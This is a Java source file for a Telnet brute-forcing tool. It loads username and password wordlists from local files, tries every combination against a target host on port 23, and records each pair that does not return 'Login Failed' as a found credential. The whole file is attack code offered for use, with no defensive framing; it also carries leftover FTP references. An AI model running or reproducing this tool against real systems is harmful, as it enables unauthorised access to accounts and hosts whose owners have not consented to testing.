package action.bruter;

import global.GlobalSetting;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintStream;
import java.net.SocketException;
import java.util.ArrayList;

import org.apache.commons.net.ftp.FTPClient;
import org.apache.commons.net.telnet.TelnetClient;

import tools.Logger;

public class TelnetBruter {
	public static final int DEFAULT_PORT = 23;
	private static ArrayList<String> userlist = new ArrayList<String>();
	private static ArrayList<String> passlist = new ArrayList<String>();
	private static TelnetClient telnetClient = null;
	
	public void run(String target) {
		if (!getUserPass()) {
			Logger.getInstance().insertLog("Error", "FtpBruter getUserPass error!");
			return;
		}
		
		for (int i=0; i<userlist.size(); i++)
			for (int j=0; j<passlist.size(); j++) 
				checkLogin(target, userlist.get(i), passlist.get(j));
	}
	
	private void checkLogin(String target, String username, String password) {
		TelnetClient tc = new TelnetClient();
        try {
			tc.connect(target, DEFAULT_PORT);
		} catch (SocketException e) {
			// TODO Auto-generated catch block
			return;
		} catch (IOException e) {
			// TODO Auto-generated catch block
			return;
		}
        InputStream in = tc.getInputStream();
        OutputStream os = tc.getOutputStream();
        
        readUntil(":", in);  
        writeUtil(username, os);  
        readUntil(":", in);  
        writeUtil(password, os); 
        
        String rs = readUntil(null, in);  
        if(rs!=null && !rs.contains("Login Failed")){  
        	Logger.getInstance().insertResult(target+":"+username+":"+password);        
        }
	}
	
	private boolean getUserPass() {
		if (userlist.size() == 0) {
			File directory = new File("");
			String courseFile = "";
			try {
				courseFile = directory.getCanonicalPath();
			} catch (IOException e) {
				return false;
			}
			
			String fileName = courseFile+"\\options\\ftp_user.txt";
			FileInputStream fis = null;
			InputStreamReader isr = null;
			BufferedReader br = null;
			try {
				String str = "";
				fis = new FileInputStream(fileName);
			    isr = new InputStreamReader(fis);
			    br = new BufferedReader(isr);
			    while ((str = br.readLine()) != null) {
			    	userlist.add(str);
			    }
			} catch (FileNotFoundException e) {
				return false;
			} catch (IOException e) {
				return false;
			} finally {
				try {
					br.close();
					isr.close();
					fis.close();
				} catch (IOException e) {
					return false;
				}
			}	
		}
		
		if (passlist.size() == 0) {
			File directory = new File("");
			String courseFile = "";
			try {
				courseFile = directory.getCanonicalPath();
			} catch (IOException e) {
				return false;
			}
			
			String fileName = courseFile+"\\options\\ftp_pass.txt";
			FileInputStream fis = null;
			InputStreamReader isr = null;
			BufferedReader br = null;
			try {
				String str = "";
				fis = new FileInputStream(fileName);
			    isr = new InputStreamReader(fis);
			    br = new BufferedReader(isr);
			    while ((str = br.readLine()) != null) {
			    	passlist.add(str);
			    }
			} catch (FileNotFoundException e) {
				return false;
			} catch (IOException e) {
				return false;
			} finally {
				try {
					br.close();
					isr.close();
					fis.close();
				} catch (IOException e) {
					return false;
				}
			}
		}
		
		return true;
	}
	
    public void writeUtil(String cmd, OutputStream os){
        try {
            cmd = cmd + "\n";
            os.write(cmd.getBytes());
            os.flush();
        } catch (IOException e) {
            e.printStackTrace();
        }
        
    }
    
    public String readUntil(String endFlag, InputStream in) {
        
        InputStreamReader isr = new InputStreamReader(in);
        
        char[] charBytes = new char[1024];
        int n = 0;
        boolean flag = false;
        String str = "";
        try {
            while((n = isr.read(charBytes)) != -1){
                for(int i=0; i< n; i++){
                    char c = (char)charBytes[i];
                    str += c;
                    //当拼接的字符串以指定的字符串结尾时,不在继续读
                    if(str.endsWith(endFlag)){
                        flag = true;
                        break;
                    }
                }
                if(flag){
                    break;
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        
        return str;
    }
}
